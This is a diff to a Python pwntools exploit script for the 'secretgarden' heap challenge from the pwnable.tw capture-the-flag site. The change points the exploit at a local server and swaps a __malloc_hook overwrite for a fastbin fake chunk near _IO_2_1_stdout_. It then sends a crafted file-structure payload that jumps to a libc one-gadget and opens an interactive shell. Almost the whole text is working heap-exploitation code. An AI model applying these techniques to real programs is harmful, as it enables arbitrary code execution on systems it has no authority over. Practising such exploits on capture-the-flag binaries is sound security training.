@@ -10,7 +10,9 @@ import sys
 elfPath = "./secretgarden"
 libcPath = "./libc_64.so.6"
 remoteAddr = "chall.pwnable.tw"
+remoteAddr = "localhost"
 remotePort = 10203
+remotePort = 9999
 
 context.binary = elfPath
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
@@ -35,7 +37,8 @@ else:
     mainArena = 0x3c3b20
     #  oneGadget = 0x45216
     #  oneGadget = 0x4526a
-    oneGadget = 0xef6c4
+    #  oneGadget = 0xef6c4
+    oneGadget = 0xf0567
 
 success = lambda name, value: log.success("{} -> {:#x}".format(name, value))
 
@@ -83,18 +86,16 @@ if __name__ == "__main__":
     #  DEBUG([0xE74], True)
     Remove(1) # 1 -> 2 -> 1
 
-    DEBUG([0xCD3], True)
-    Raise(0x60, p64(libc.sym['__malloc_hook'] - 0x28 + 5)) # 2 -> 1 -> fakeChunk
+    Raise(0x60, p64(libc.sym['_IO_2_1_stdout_'] + 0x98 + 5))
     Raise(0x60, 'a' * 0x60) # 1 -> fakeChunk
     Raise(0x60, 'b' * 0x60) # fakeChunk
-    #  DEBUG([0xDA1], True)
-    Raise(0x60, '\0' * 19 + p64(libc.address + oneGadget))
 
-    #  DEBUG([0xE74], True)
-    #  io.sendlineafer(" : ", "1")
-    Remove(0)
-    #  DEBUG([0xE74], True)
-    Remove(0)
-    
+    payload = "\0" * 3 + p64(0) * 2 + p64(0x00000000ffffffff) + p64(0) + p64(libc.address + oneGadget) + p64(libc.sym['_IO_2_1_stdout_'] + 152)
+    #  DEBUG([0xD18], True)
+    #  raw_input("DEBUG: ")
+    io.sendline("1")
+    io.sendline(str(0x60))
+    io.sendafter(" :", payload)
+
     io.interactive()
     io.close()
